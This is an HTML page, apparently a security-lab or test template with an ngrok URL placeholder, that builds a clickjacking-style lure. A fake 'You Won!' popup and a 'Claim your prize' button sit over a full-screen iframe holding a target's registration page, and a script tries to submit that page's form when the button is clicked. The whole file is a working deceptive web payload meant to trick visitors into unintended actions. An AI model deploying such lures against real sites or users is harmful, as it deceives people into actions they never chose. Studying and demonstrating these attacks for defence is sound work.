<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>You Won!</title>
    <style>
        /* iframe occupies the full screen and is visible */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 1;
        }

        /* Style for the "You Won!" popup with an outline */
        .popup {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            padding: 20px;
            background-color: white;
            border: 2px solid #333; /* Dark gray outline */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            text-align: center;
            font-family: Arial, sans-serif;
            z-index: 2;
        }

        /* Header style */
        .popup .message {
            font-size: 1.5em;
            font-weight: bold;
            color: green;
            margin-bottom: 15px;
        }

        /* Button style */
        .popup .fake-button {
            padding: 10px 20px;
            font-size: 1.2em;
            color: white;
            background-color: blue;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<!-- Embedding the registration form in an iframe -->
<iframe id="targetFrame" src="{{ ngrok_url }}/register_html"></iframe>

<!-- Popup with a fake message and a button in the middle of the screen -->
<div class="popup">
    <div class="message">You Won!</div> <!-- False headline -->
    <button class="fake-button" onclick="claimPrize()">Claim your prize</button> <!-- False button -->
</div>

<script>
    // Function to submit a form in an iframe after clicking a fake button
    function claimPrize() {
        const iframe = document.getElementById('targetFrame');
        try {
            iframe.contentWindow.document.getElementById('registerForm').submit();
        } catch (error) {
            console.error("Access to iframe content denied due to security policy.");
        }
    }
</script>

</body>
</html>
